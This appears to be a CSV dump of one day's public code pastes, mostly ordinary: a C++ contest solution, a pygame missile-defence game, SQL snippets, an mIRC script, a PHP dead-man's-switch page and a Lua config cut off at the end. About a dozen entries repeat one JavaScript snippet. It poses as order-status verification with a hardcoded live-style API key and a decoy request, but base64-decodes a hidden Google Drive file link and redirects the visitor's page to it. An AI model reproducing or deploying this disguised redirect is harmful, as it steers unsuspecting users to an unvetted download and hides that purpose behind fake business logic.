id,title,username,language,date,content
Ye3T9Nhc,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:56:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/552/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Tdt2zYqj,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:43:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/235/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ZJ4cF59a,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:31:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/913/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
yRChxepW,成绩统计 参考代码,Dmaxiya,C++,Tuesday 25th of March 2025 12:24:06 PM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
int n, k;
LL T;
LL num[maxn], sum[maxn], tmp[maxn], sum2[maxn];

bool judge(int n) {
    memcpy(tmp, num, sizeof(num));
    sort(tmp + 1, tmp + 1 + n);
    for (int i = 1; i <= n; ++i) {
        sum[i] = sum[i - 1] + tmp[i];
        sum2[i] = sum2[i - 1] + tmp[i] * tmp[i];
    }
    double mn = 1e100;
    for (int i = k; i <= n; ++i) {
        double avg = (sum[i] - sum[i - k]) / k;
        mn = min(mn, sum2[i] - sum2[i - k] - 2 * avg * (sum[i] - sum[i - k]) + k * avg * avg);
    }
    return mn / k <= T;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif
    ios::sync_with_stdio(false);

    cin >> n >> k >> T;
    if (n < k) {
        cout << -1 << endl;
        return 0;
    }
    for (int i = 1; i <= n; ++i) {
        cin >> num[i];
    }
    int low = k - 1;
    int high = n + 1;
    int mid;
    while (high - low > 1) {
        mid = (high + low) >> 1;
        if (judge(mid)) {
            high = mid;
        } else {
            low = mid;
        }
    }
    cout << (high == n + 1 ? -1 : high) << endl;

    return 0;
}
"
pmLGuVps,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:19:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/525/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
W6ikiK5p,Missile Defence,CatNamedWill,Python,Tuesday 25th of March 2025 12:11:32 PM CDT,"import pygame
import random
import math

# Initialize PyGame
pygame.init()

# Screen dimensions
WIDTH, HEIGHT = 800, 600
WIN = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption(""Mutual Assured Destruction"")

# Colors
WHITE = (255, 255, 255)
BLACK = (0,0,0)
RED = (255, 0, 0)
BLUE = (0, 0, 255)
GREEN = (0, 255, 0)
YELLOW = (255, 255, 0)

# Game variables
FPS = 60
MISSILE_EVENT = pygame.USEREVENT + 1
pygame.time.set_timer(MISSILE_EVENT, 1000)  # Spawn a missile every second
CITY_COUNT = 12

# Font
FONT = pygame.font.SysFont('arial', 20)

class Missile:
    def __init__(self):
        self.x = random.randint(0, WIDTH)
        self.y = 0
        self.target_x = random.randint(50, WIDTH - 50)
        self.target_y = HEIGHT - 50
        self.speed = random.uniform(3, 7)
        self.angle = math.atan2(self.target_y - self.y, self.target_x - self.x)
        self.dx = math.cos(self.angle) * self.speed
        self.dy = math.sin(self.angle) * self.speed

    def move(self):
        self.x += self.dx
        self.y += self.dy

    def draw(self, win):
        pygame.draw.circle(win, RED, (int(self.x), int(self.y)), 3)

class Interceptor:
    def __init__(self, x, y):
        self.x = WIDTH / 2
        self.y = HEIGHT - 50
        self.target_x = x
        self.target_y = y
        self.speed = 5
        self.angle = math.atan2(self.target_y - self.y, self.target_x - self.x)
        self.dx = math.cos(self.angle) * self.speed
        self.dy = math.sin(self.angle) * self.speed
        self.exploded = False
        self.explosion_max_radius = 50
        self.explosion_duration = 30  # frames
        self.explosion_timer = 0

    def move(self):
        if not self.exploded:
            # Move towards target
            self.x += self.dx
            self.y += self.dy
            # Check if reached target
            distance_to_target = math.hypot(self.x - self.target_x, self.y - self.target_y)
            if distance_to_target <= self.speed:
                self.exploded = True
                self.explosion_timer = 0
        else:
            # Explosion timer
            self.explosion_timer += 1

    def draw(self, win):
        if not self.exploded:
            pygame.draw.circle(win, BLUE, (int(self.x), int(self.y)), 3)
        else:
            # Explosion radius increases over time
            current_radius = (self.explosion_timer / self.explosion_duration) * self.explosion_max_radius
            pygame.draw.circle(win, YELLOW, (int(self.x), int(self.y)), int(current_radius))

class City:
    def __init__(self, x):
        self.x = x
        self.y = HEIGHT - 20
        self.alive = True

    def draw(self, win):
        if self.alive:
            pygame.draw.rect(win, GREEN, (self.x - 20, self.y, 40, 20))

def main():
    run = True
    clock = pygame.time.Clock()
    missiles = []
    interceptors = []
    cities = [City(WIDTH * i / CITY_COUNT + WIDTH / (2 * CITY_COUNT)) for i in range(CITY_COUNT)]
    score = 0

    while run:
        clock.tick(FPS)
        WIN.fill(BLACK)

        # Event handling
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                run = False
            elif event.type == MISSILE_EVENT:
                missiles.append(Missile())
            elif event.type == pygame.MOUSEBUTTONDOWN:
                x, y = pygame.mouse.get_pos()
                interceptors.append(Interceptor(x, y))

        # Move and draw missiles
        for missile in missiles[:]:
            missile.move()
            missile.draw(WIN)
            # Check for collision with cities
            for city in cities:
                if city.alive and math.hypot(missile.x - city.x, missile.y - city.y) < 10:
                    city.alive = False
                    missiles.remove(missile)
                    break
            else:
                # Check if missile reached the ground
                if missile.y >= HEIGHT:
                    missiles.remove(missile)

        # Move and draw interceptors
        for interceptor in interceptors[:]:
            interceptor.move()
            interceptor.draw(WIN)
            if interceptor.exploded:
                # Current explosion radius
                current_radius = (interceptor.explosion_timer / interceptor.explosion_duration) * interceptor.explosion_max_radius
                # Check for missiles within current explosion radius
                for missile in missiles[:]:
                    distance = math.hypot(interceptor.x - missile.x, interceptor.y - missile.y)
                    if distance <= current_radius:
                        try:
                            missiles.remove(missile)
                            score += 100
                        except ValueError:
                            pass
                # Remove interceptor if explosion is over
                if interceptor.explosion_timer >= interceptor.explosion_duration:
                    interceptors.remove(interceptor)
            else:
                # Remove interceptor if it goes off screen
                if interceptor.y <= 0 or interceptor.x < 0 or interceptor.x > WIDTH:
                    interceptors.remove(interceptor)

        # Draw cities
        for city in cities:
            city.draw(WIN)

        # Draw score
        score_text = FONT.render(f""Score: {score}"", True, WHITE)
        WIN.blit(score_text, (10, 10))

        # Check for game over
        if not any(city.alive for city in cities):
            game_over_text = FONT.render(""Game Over"", True, RED)
            WIN.blit(game_over_text, (WIDTH / 2 - 50, HEIGHT / 2))
            pygame.display.update()
            pygame.time.delay(3000)
            run = False

        pygame.display.update()

    pygame.quit()

if __name__ == ""__main__"":
    main()
"
s0rSgRzq,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 12:07:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/139/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KT7eWp8U,Untitled,hubertzoo90,JavaScript,Tuesday 25th of March 2025 11:55:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/670/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uSJMYCpX,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:43:02 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/886/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Wrtr8tus,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:30:44 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/241/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aDbf9T2z,petle1,Cassimus,C#,Tuesday 25th of March 2025 11:19:57 AM CDT,"#region zad1
// System.Console.WriteLine(""Podaj liczbę calkowitą: "");
// int liczba = int.Parse(Console.ReadLine());
// System.Console.WriteLine(""Ile razy mam dodać 5?"");
// int licznik = int.Parse(Console.ReadLine());

// int suma = liczba;

// for(int i = 0; i < licznik; i++  )
// {
//     suma += 5;
//     System.Console.WriteLine($""{i+1}. Po dodaniu 5 {i+1} raz: {suma}"");
// }

// DRY - Don't Repeate Yourself 
#endregion"
AgtzJXq9,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:18:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/861/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
k0KjsMzv,Untitled,Sansuall,MySQL,Tuesday 25th of March 2025 11:14:45 AM CDT,"| entry  | InventoryType | AllowableClass | AllowableRace | ItemLevel | subclass | name                                | name_loc8                                                       | class | itemset | tooltip                                                                                                                                                                                                                       | tooltip_loc8                                                                                                                                                                                                                                                                                                                                                         |

| 300104 |             0 |             -1 |            -1 |        30 |        5 | Uldir Mythic (385-395 ilvl + other) | Ульдир Мифический (385-395 илвл + допы)                         |    22 |       0 | Upon purchase, you will receive one item 385-395 iLvl, from 1000 to 7000 gold, from 500 to 2500 XP for the Heart of Azeroth, as well as reputation with some factions (each category has its own percentage of random drops). | При приобретении вы получаете одну вещь 385-395 ilvl, от 1000 до 7000 золота, от 500 до 2500 ед.опыта Сердца Азерот, а также репутацию с некоторыми фракциями (каждая категория имеет свой % случайного выпадения).
"
32kPG2dd,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 11:06:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/632/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Mn9E1xmZ,Copiar em Aula,Ninbo,JavaScript,Tuesday 25th of March 2025 10:57:45 AM CDT,"ALTER TABLE pastebin.""USER"" 
	ADD CONSTRAINT nome_maior_4 CHECK (LENGTH(nome) >= 4),
	ADD CONSTRAINT email_maior_10 check (LENGTH(email) >= 10),
	ADD CONSTRAINT password_has_needed_chars CHECK (
		(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[A-Z]', '', 'g'))) >= 2 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[a-z]', '', 'g'))) >= 4 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[0-9]', '', 'g'))) >= 3 AND
    	(LENGTH(passwd) - LENGTH(REGEXP_REPLACE(passwd, '[!""#$%\/()""=?»«~^\\\.-_:.;,]', '', 'g'))) >= 2
	)
;"
DtJAHJm2,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:54:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/521/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
De1CtkTP,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:42:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/393/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
atCgmkyu,RSS,Tiago_f,mIRC,Tuesday 25th of March 2025 10:37:15 AM CDT,"  elseif ($devent == sclick) {
    if ($did == 6) {
      if ($did(3)) && ($did(4)) {
        var %u = $replace($did(4),$chr(32),% $+ 20)
        if (%rss.edit) {
          var %n = $encode($did(3),m),%v = $cell(feedr,3,1)),%e = %v $+ $chr(1) $+ *
          while ($hfind(rssdone,%e,1,w)) {
            var %i = $v1
            hadd rssdone $+(%n,$chr(1),$wd(%i,2,1)) 1
            hdel rssdone %i
          }
          hadd rssdone SHA1: $+ %n $hget(rssdone,SHA1: $+ %v)
          hdel rssdone SHA1: $+ %v
          hadd rss %u $calc($wd($did(feedr,3).seltext,5,32) -1) $did(3)
          hdel rss %rss.edit
          did -co feedr 3 $did(feedr,3).sel 1 +fs 0 0 $wd($did(feedr,3).seltext,5,32) $did(3) $+ 	+ 0 0 0 %u
        }
        elseif ( When I add a new one, stop when it already exists ) 

        else {
          hadd rss %u 0 $did(3)
          mdxunsel feedr 3
          did -ac feedr 3 1 + 0 0 1 $did(3) $+ 	+ 0 0 0 %u
        }
        hsave -ob rss $_tabdir(rss.tbl)
        did $iif($did(feedr,3).sel,-e,-b) feedr 6,8,24,26
        did $iif($did(feedr,3).lines >= 1,-e,-b) feedr 7
      }
      else { beep.error | halt }
    }
  }
"
mE4aNii4,dmsr.php,somdcomputerguy,PHP,Tuesday 25th of March 2025 10:33:44 AM CDT,"<? require_once('common.php'); checkUser(); ?>
<!DOCTYPE html>
<html><head>
<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>
<meta http-equiv='Content-Language' content='EN'>
<meta name=""viewport"" content=""width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no"">
<title>DMS</title>
<style>
body {
  font-size: 1.3em;
  font-size-adjust: from-font;
  font-variant: small-caps;
  color: orange;
  background: rgba(0, 0, 0, 1);
}

button {
  margin: 1px;
  padding: 3px 5px;
  font-size: 12px;
  border-radius: 3px;
}
</style></head><body>
<center><br><br><div id='dateTime'></div>
<script src='dtscript.js'></script>

<?
if(isset($_GET['hgen'])) { hgenesis(); }
if(isset($_GET['update'])) { update(); }
if(isset($_GET['logout'])) { logoutUser(); }

date_default_timezone_set('America/New_York');

$CurrenTime = time();
$FinalTime  = '+25 days 25 minutes';
$FinalFile  = 'dmsr.txt';
$datestr   = ""l\, F j\<\s\u\p\>\<\s\m\a\l\l\>S\<\/\s\m\a\l\l\>\<\/\s\u\p\> Y g\:i A"";

if(!file_exists($FinalFile)) { file_put_contents($FinalFile, $CurrenTime); }

$FinalCon = file_get_contents($FinalFile); $FinalConStr = date($datestr, $FinalCon);

echo ""<br>Switch closed $FinalConStr<br><br>Update by "" .  date ($datestr, strtotime($FinalTime, $FinalCon));

if(strtotime($FinalTime, $FinalCon) < $CurrenTime){
	echo ""<br><br><strong>Deadline!</strong><br>"";
	//unlink($FinalFile);
	// mailer();
	}

if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
echo ""<br><br><button onclick=window.location.replace('?logout')>Log out</button>&ensp;&ensp;<button onclick=window.location.replace('?update')>Update</button>""; } else {echo ""<br><br><button onclick=window.location.replace('login.php')>Logged out</button>&ensp;&ensp;"";
if(strtotime($FinalTime, $FinalCon) < $CurrenTime){echo ""&ensp;&ensp;<button onclick=window.location.replace('?hgen')>HGenesis</button>"";}
}

function update(){
	if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
	date_default_timezone_set('America/New_York');
	
	$CurrenTime = time();
    $FinalFile  = 'dmsr.txt'; $NotifyFile = 'dmsr_notify.txt';

	file_put_contents($FinalFile, $CurrenTime); echo ""<script>location.href = 'dmsr.php'</script>"";
}}

function hgenesis(){
	if ((isset($_SESSION['validUser'])) && ($_SESSION['validUser'] == true)){
		$FinalFile  = 'dmsr.txt';
		unlink($FinalFile);
		echo ""<script>location.href = 'dmsr.php'</script>"";
}}

function mailer(){
$subject = ""DMS Notifier"";
$message = ""Hey now. <a href='https://gowansb.powweb.com/dms/dmsr.php'>Login if you have to and check if you want to</a>."";
$mailto  = """";
$headers = ""From: "";

mail(""$mailto"", ""$subject"" , ""$message"", ""$headers"");
}

?></center></body></html>"
Erzxxp0A,Insights Breadcrumbs - Inline,Aleso1,JavaScript,Tuesday 25th of March 2025 10:30:50 AM CDT,"<nav aria-label=""Breadcrumb"">
  <ul class=""breadcrumbs"" itemscope itemtype=""https://schema.org/BreadcrumbList"" style=""display:flex; flex-wrap:wrap; align-items:center; gap:6px; font-size:14px; list-style:none; padding:0; margin:0;"">
    
    <li itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center;"">
      <a href=""https://www.ie.edu/insights/"" itemprop=""item"" style=""text-decoration:none; color:#0073e6;"">
        <span itemprop=""name"">Home</span>
      </a>
      <meta itemprop=""position"" content=""1"" />
    </li>

    <li style=""display:flex; align-items:center;"">»</li>

    <li itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center;"">
      <a href=""https://www.ie.edu/insights/articles/"" itemprop=""item"" style=""text-decoration:none; color:#0073e6;"">
        <span itemprop=""name"">Articles</span>
      </a>
      <meta itemprop=""position"" content=""2"" />
    </li>

    <li style=""display:flex; align-items:center;"">»</li>

    <li class=""current"" itemprop=""itemListElement"" itemscope itemtype=""https://schema.org/ListItem"" style=""display:flex; align-items:center; color:#333;"">
      <span itemprop=""name"">Politicians Take to the Pods</span>
      <meta itemprop=""position"" content=""3"" />
    </li>

  </ul>
</nav>
"
QQSYebyW,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:30:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/206/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RHG99pER,Hireling CaveBot Dialog,martintokio,Lua,Tuesday 25th of March 2025 10:19:48 AM CDT,"--Hireling Dialog
local hireling_settings = {
    dish_name = ""Carrion Casserole"",
    dish_id = 29414,
    dish_amount = 10,
    hireling_name = ""Otclient""
}
